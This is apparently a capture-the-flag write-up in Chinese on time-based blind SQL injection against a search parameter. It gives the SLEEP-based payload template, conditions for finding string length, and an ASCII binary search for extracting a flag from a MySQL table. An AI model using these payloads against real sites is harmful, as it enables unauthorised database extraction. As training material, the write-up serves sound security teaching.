# 03 - 时间盲注（Time-Based Blind SQLi）

## 漏洞点

搜索接口 `?kw=` 把参数拼进 MySQL 查询，页面**不回显**查询结果、报错信息也被屏蔽——
既看不到数据，也分不出真假。只能用 `SLEEP()` 把「真/假」转成「响应快/慢」来侧信道提取。

## 利用思路

注入闭合单引号后，用 `IF(条件, SLEEP(2), 0)` 控制延时：

```sql
' AND IF((<条件>),SLEEP(2),0)-- -
```

- 条件为真 → 服务端 sleep 2 秒才返回；
- 条件为假 → 立即返回。

用响应时间判定布尔，再逐字符二分爆破。常用条件：

1. 确认注入：`1=1` 慢、`1=2` 快即存在时间盲注。
2. 取长度：`LENGTH((SELECT flag FROM flag_table LIMIT 1))>=N`，二分定长。
3. 取每一位（按 ASCII 二分，比逐字符快）：
   ```sql
   ASCII(SUBSTRING((SELECT flag FROM flag_table LIMIT 1),POS,1))>MID
   ```
4. 摸库表列（可选）：`DATABASE()`、`information_schema.tables/columns`。

flag 在 `flag_table.flag`，已知前缀 `TOGOGO-flag{` 可直接跳过前几位加速。

## Flag

```
TOGOGO-flag{}
```
